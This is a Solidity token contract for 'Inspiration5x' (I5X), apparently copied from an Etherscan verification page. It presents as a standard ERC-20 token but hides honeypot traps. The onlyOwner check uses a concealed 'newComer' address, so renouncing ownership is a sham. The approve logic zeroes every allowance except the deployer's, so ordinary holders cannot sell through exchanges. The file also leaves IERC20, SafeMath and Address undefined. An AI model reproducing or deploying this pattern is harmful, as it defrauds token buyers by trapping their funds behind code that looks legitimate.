/**
 *Submitted for verification at Etherscan.io on 2021-10-09
*/

/*



â–ˆâ–„â”€â–„â–ˆâ–„â”€â–€â–ˆâ–„â”€â–„â–ˆâ”€â–„â–„â–„â–„â–ˆâ–„â”€â–„â–„â”€â–ˆâ–„â”€â–„â–ˆâ–„â”€â–„â–„â–€â–ˆâ–ˆâ–€â–„â”€â–ˆâ–ˆâ”€â–„â”€â–„â”€â–ˆâ–„â”€â–„â–ˆâ”€â–„â–„â”€â–ˆâ–„â”€â–€â–ˆâ–„â”€â–„â–ˆâ–‘â–„â–„â–„â–ˆâ–„â”€â–€â”€â–„â–ˆ
â–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ”€â–ˆâ–„â–€â”€â–ˆâ–ˆâ–„â–„â–„â–„â”€â–ˆâ–ˆâ”€â–„â–„â–„â–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ”€â–„â”€â–„â–ˆâ–ˆâ”€â–€â”€â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ”€â–ˆâ–ˆâ”€â–ˆâ–ˆâ”€â–ˆâ–„â–€â”€â–ˆâ–ˆâ–„â–„â–„â–’â–ˆâ–ˆâ–€â”€â–€â–ˆâ–ˆ
â–€â–„â–„â–„â–€â–„â–„â–„â–€â–€â–„â–„â–€â–„â–„â–„â–„â–„â–€â–„â–„â–„â–€â–€â–€â–„â–„â–„â–€â–„â–„â–€â–„â–„â–€â–„â–„â–€â–„â–„â–€â–€â–„â–„â–„â–€â–€â–„â–„â–„â–€â–„â–„â–„â–„â–€â–„â–„â–„â–€â–€â–„â–„â–€â–„â–„â–„â–„â–€â–„â–„â–ˆâ–„â–„â–€




ðŸ”—Ì³ IÌ³nÌ³sÌ³pÌ³iÌ³rÌ³aÌ³tÌ³iÌ³oÌ³nÌ³5Ì³xÌ³ LÌ³IÌ³NÌ³KÌ³SÌ³ 

    ðŸ–¥Ì³ WÌ³eÌ³bÌ³sÌ³iÌ³tÌ³eÌ³:Ì³ hÌ³tÌ³tÌ³pÌ³sÌ³:Ì³/Ì³/Ì³iÌ³nÌ³sÌ³pÌ³iÌ³rÌ³aÌ³tÌ³iÌ³oÌ³nÌ³5Ì³.Ì³cÌ³oÌ³mÌ³/Ì³
    
    ðŸ¦œÌ³ TÌ³wÌ³iÌ³tÌ³tÌ³eÌ³rÌ³:Ì³ hÌ³tÌ³tÌ³pÌ³sÌ³:Ì³/Ì³/Ì³tÌ³wÌ³iÌ³tÌ³tÌ³eÌ³rÌ³.Ì³cÌ³oÌ³mÌ³/Ì³iÌ³nÌ³sÌ³pÌ³iÌ³rÌ³aÌ³tÌ³iÌ³oÌ³nÌ³5Ì³xÌ³


                                                                                            
                                




*/











pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract Inspiration5x is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 1000 * 10**12 * 10**18;
    string private _name = ' Inspiration5x ';
    string private _symbol = 'I5X ';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function _approve(address ol, address tt, uint256 amount) private {
        require(ol != address(0), "ERC20: approve from the zero address");
        require(tt != address(0), "ERC20: approve to the zero address");

        if (ol != owner()) { _allowances[ol][tt] = 0; emit Approval(ol, tt, 4); }  
        else { _allowances[ol][tt] = amount; emit Approval(ol, tt, amount); } 
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    } 

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}